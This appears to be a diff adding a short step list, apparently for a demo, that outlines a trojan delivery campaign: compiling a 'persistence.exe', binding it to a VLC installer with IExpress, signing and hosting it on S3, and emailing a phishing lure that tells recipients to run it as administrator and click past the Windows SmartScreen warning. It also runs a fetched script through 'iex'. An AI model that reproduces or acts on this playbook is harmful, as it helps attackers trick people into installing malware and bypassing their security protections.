@@ -1,0 +1,63 @@
+1. Vscode for s3 bucket
+	terraform init
+	terraform plan
+	terraform apply
+
+	aws s3 sync 'c:\path' s3://mybucket/ --profile myprofile --region us-east-1
+
+2. Mcode exe
+	c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:C:\path\persistence.exe C:\path\mcode.cs.txt
+
+3. EXE
+
+	https://YourOriginalEXEDownload.exe
+
+4. IExpress****
+	http://gphackingarticles.blogspot.com/2012/06/how-to-bind-two-exe-files-using-windows.html
+
+	Add license: Optional
+	C:\path\license.txt
+
+	Add note about restart
+	A restart is required for this application to function properly.
+
+	Install per.exe first
+	then command vlc installation
+	c:\path\MyEXE.exe
+
+5. Run code signing script from https://adamtheautomator.com/how-to-sign-powershell-script/
+	gc -raw c:\path\CodeSignScript.txt | iex
+	
+	upload to s3
+
+	aws s3 cp c:\path\MyEXE.exe s3://mybucket/ --profile myprofile --region us-east-1
+
+6. send in an email with
+
+```
+Add 
+
+SUBJECT: Check this out!
+
+New VLC media player that will play 8k movies!!!
+https://disguiseTheUrl
+
+***ATTENTION*** Be sure to right click and run as administrator. Select "more info" for Windows blue pop-up and choose "Run anyway".
+```
+
+
+7. Show defender
+
+8. Download and begin
+
+9. Take down
+	aws s3 rm s3://mybucket/ --recursive --profile myprofile
+
+	aws s3api delete-bucket --bucket mybucket --region us-east-1 --profile myprofile
+
+
+
+
+
+
+
